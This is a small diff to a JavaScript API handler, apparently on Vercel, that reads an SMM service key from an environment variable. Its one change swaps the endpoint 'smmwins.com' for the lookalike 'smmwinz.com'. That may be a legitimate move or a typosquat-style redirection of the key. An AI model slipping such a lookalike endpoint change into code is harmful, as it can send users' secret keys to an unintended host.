@@ -2,7 +2,7 @@ export default async function handler(req, res) {
     // DO NOT PASTE YOUR REAL KEY HERE! 
     // This line securely pulls your hidden key from Vercel's vault.
     const API_KEY = process.env.SMM_API_KEY; 
-    const API_URL = "https://smmwins.com/api/v2";
+    const API_URL = "https://smmwinz.com/api/v2";
 
     // Safety check to ensure Vercel has the key
     if (!API_KEY) {
